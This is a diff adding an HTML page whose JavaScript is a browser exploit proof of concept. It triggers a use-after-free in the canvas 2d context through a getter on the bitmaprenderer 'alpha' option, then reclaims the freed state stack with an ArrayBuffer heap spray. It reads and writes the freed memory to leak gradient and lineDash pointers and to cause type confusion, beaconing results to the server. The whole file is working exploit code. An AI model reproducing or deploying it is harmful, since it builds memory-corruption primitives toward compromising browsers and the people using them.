@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V599</title></head>
+<body><pre id="out">V599</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var u='/beacon/V599-'+tag+'?d='+encodeURIComponent(String(d).slice(0,500))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},300);
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function h64(hi,lo){return '0x'+('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
+
+bk('BOOT','v599-gradient-ptr-leak');
+
+/* CONFIG: 8 saves → capacity 16, buffer 16*400=6400, FastMalloc class=6656
+ * Top state index=8, byte offset=8*400=3200
+ * lineWidth @State+48 → byte 3248 in buffer
+ * strokeStyle payload @State+16 → byte 3216
+ * fillStyle payload @State+32 → byte 3232 */
+var NSAVES=8, SC=6656, WM=1.717;
+var MARKER=6.02214076e23;
+var TOP=NSAVES, SB=TOP*400;
+var SPRAY_N=600;
+
+/* PRE-ALLOCATE spray array to full capacity BEFORE UAF.
+ * This prevents butterfly reallocation during spray that could
+ * hit the 768B size class and reclaim the freed context slot.
+ * Butterfly size: 600*8+8=4808B → ~5120B class (NOT 768B). */
+var abs=new Array(SPRAY_N);
+for(var _p=0;_p<SPRAY_N;_p++) abs[_p]=0;
+
+/* PHASE 1: UAF TRIGGER
+ * bitmaprenderer outer + 2d inner + defineProperty on alpha.
+ * Canvas as global to prevent GC. Gradients created inside getter. */
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+var innerCtx=null,grad1=null,grad2=null;
+var uafOpts={};
+Object.defineProperty(uafOpts,'alpha',{get:function(){
+  innerCtx=canvas.getContext('2d');
+  grad1=innerCtx.createLinearGradient(0,0,100,100);
+  grad1.addColorStop(0,'red');grad1.addColorStop(1,'blue');
+  grad2=innerCtx.createLinearGradient(0,0,200,200);
+  grad2.addColorStop(0,'green');grad2.addColorStop(1,'yellow');
+  for(var i=0;i<NSAVES;i++) innerCtx.save();
+  innerCtx.lineWidth=MARKER;
+  return true;
+}});
+
+/* TRIGGER: after return, 2d context+stateStack FREED.
+ * NO allocations between this return and spray! */
+canvas.getContext('bitmaprenderer',uafOpts);
+
+/* PHASE 2: SPRAY stateStack buffer (6656B) ONLY.
+ * Use INDEXED ASSIGNMENT into pre-allocated array — NO push, NO butterfly realloc.
+ * Each iteration: JSArrayBuffer cell (~48B MarkedSpace) + backing (6656B FastMalloc).
+ * Neither is 768B, so context slot stays intact. */
+for(var i=0;i<SPRAY_N;i++) abs[i]=new ArrayBuffer(SC);
+
+/* PHASE 3: ALL reads — do them before any beacons.
+ * Store results in primitives (no new object allocation). */
+var lw1=-999,lw1e='';
+try{lw1=innerCtx.lineWidth;}catch(e){lw1e=e.name;}
+
+var writeOK=0;
+try{innerCtx.lineWidth=WM;writeOK=1;}catch(e){lw1e+='|w:'+e.name;}
+
+var hitIdx=-1,hitOff=-1;
+if(writeOK){
+  for(var j=0;j<SPRAY_N;j++){
+    var fv=new Float64Array(abs[j]);
+    for(var k=0;k<fv.length;k++){
+      if(fv[k]===WM){hitIdx=j;hitOff=k*8;break;}
+    }
+    if(hitIdx>=0)break;
+  }
+}
+
+var ssOK=0,fsOK=0,ssE='',fsE='';
+var ssLo=0,ssHi=0,fsLo=0,fsHi=0,ssVidx=0,fsVidx=0;
+var bigSS=0,bigFS=0,bigOK=0;
+
+if(hitIdx>=0){
+  try{innerCtx.strokeStyle=grad1;ssOK=1;}catch(e){ssE=e.name;}
+  try{innerCtx.fillStyle=grad2;fsOK=1;}catch(e){fsE=e.name;}
+
+  var hitAB=abs[hitIdx],dv=new DataView(hitAB),u8=new Uint8Array(hitAB);
+  var ssPayOff=hitOff-32,ssVOff=hitOff-24;
+  var fsPayOff=hitOff-16,fsVOff=hitOff-8;
+
+  if(ssPayOff>=0 && ssPayOff+8<=hitAB.byteLength){
+    ssLo=dv.getUint32(ssPayOff,true);
+    ssHi=dv.getUint32(ssPayOff+4,true);
+    ssVidx=dv.getUint32(ssVOff,true);
+    try{bigSS=dv.getBigUint64(ssPayOff,true);bigOK=1;}catch(e){}
+  }
+  if(fsPayOff>=0 && fsPayOff+8<=hitAB.byteLength){
+    fsLo=dv.getUint32(fsPayOff,true);
+    fsHi=dv.getUint32(fsPayOff+4,true);
+    fsVidx=dv.getUint32(fsVOff,true);
+    try{bigFS=dv.getBigUint64(fsPayOff,true);}catch(e){}
+  }
+}
+
+/* Variant confusion: change gradient(2)→Color(1) and read strokeStyle as color */
+var confusedStr='';
+if(hitIdx>=0 && ssVidx>0){
+  var ssVOff2=hitOff-24;
+  var origV=u8[ssVOff2];
+  u8[ssVOff2]=1;
+  try{confusedStr=String(innerCtx.strokeStyle).slice(0,40);}catch(e){confusedStr='ERR:'+e.name;}
+  u8[ssVOff2]=origV;
+}
+
+/* lineDash vector pointer: at State+168 from lineWidth@+48 → +120 bytes forward */
+var ldLo=0,ldHi=0;
+if(hitIdx>=0){
+  var ldOff=hitOff+120;
+  try{
+    innerCtx.setLineDash([1.5,2.5,3.5]);
+    if(ldOff+8<=abs[hitIdx].byteLength){
+      ldLo=dv.getUint32(ldOff,true);
+      ldHi=dv.getUint32(ldOff+4,true);
+    }
+  }catch(e){}
+}
+
+/* Hex dump of neighborhood around hit */
+var hexDump='';
+if(hitIdx>=0){
+  var base=Math.max(0,hitOff-48);
+  var end=Math.min(abs[hitIdx].byteLength,hitOff+64);
+  for(var b=base;b<end;b+=4){
+    hexDump+=('00000000'+dv.getUint32(b,true).toString(16)).slice(-8)+' ';
+  }
+}
+
+/* PHASE 4: BEACONS — all data collected, now safe to allocate */
+if(!innerCtx){
+  bk('FAIL','no-inner');
+  say('FAIL: no inner context');
+} else {
+  /* P1: lineWidth status */
+  var status='unknown';
+  if(lw1e) status='ERR:'+lw1e;
+  else if(lw1===0) status='RECLAIMED';
+  else if(Math.abs(lw1-MARKER)<1e10) status='INTACT';
+  else status='STALE:'+f2h(lw1);
+  bk('P1',status+',lw='+f2h(typeof lw1==='number'?lw1:0));
+  say('P1 lineWidth: '+status);
+
+  /* P2: write-through hit */
+  bk('P2','hit='+hitIdx+',off='+hitOff+',exp='+(SB+48)+',wOK='+writeOK);
+  say('P2 hit: idx='+hitIdx+' off='+hitOff+' (expected '+(SB+48)+')');
+
+  /* P3: gradient plant */
+  bk('P3','ss='+ssOK+',fs='+fsOK+(ssE?',se='+ssE:'')+(fsE?',fe='+fsE:''));
+  say('P3 plant: ss='+ssOK+' fs='+fsOK);
+
+  /* P4: raw pointer bytes */
+  var ssP=h64(ssHi,ssLo);
+  var fsP=h64(fsHi,fsLo);
+  bk('P4','ssPtr='+ssP+',sv='+ssVidx+',fsPtr='+fsP+',fv='+fsVidx);
+  say('P4 strokeStyle ptr: '+ssP+' vidx='+ssVidx);
+  say('P4 fillStyle ptr:   '+fsP+' vidx='+fsVidx);
+
+  if(ssHi>0x1000 && ssHi<0x800000 && (ssLo&0x3)===0){
+    bk('LEAK','SS='+ssP);
+    say('*** GRADIENT1 PTR LEAK: '+ssP+' ***');
+  }
+  if(fsHi>0x1000 && fsHi<0x800000 && (fsLo&0x3)===0){
+    bk('LEAK','FS='+fsP);
+    say('*** GRADIENT2 PTR LEAK: '+fsP+' ***');
+  }
+
+  /* P5: BigUint64 */
+  if(bigOK){
+    bk('P5','ss=0x'+bigSS.toString(16)+',fs=0x'+bigFS.toString(16));
+    say('P5 BigUint64 ss: 0x'+bigSS.toString(16));
+    say('P5 BigUint64 fs: 0x'+bigFS.toString(16));
+  }
+
+  /* P6: variant confusion */
+  if(confusedStr){
+    bk('P6','confused='+confusedStr);
+    say('P6 confused strokeStyle: '+confusedStr);
+  }
+
+  /* P7: lineDash pointer */
+  var ldP=h64(ldHi,ldLo);
+  bk('P7','ldPtr='+ldP);
+  say('P7 lineDash ptr: '+ldP);
+
+  /* P8: hex dump */
+  bk('P8',hexDump.slice(0,400));
+  say('P8 hex: '+hexDump);
+}
+
+setTimeout(function(){bk('DONE','last');say('\nDONE');},5000);
+</script>
+</body></html>
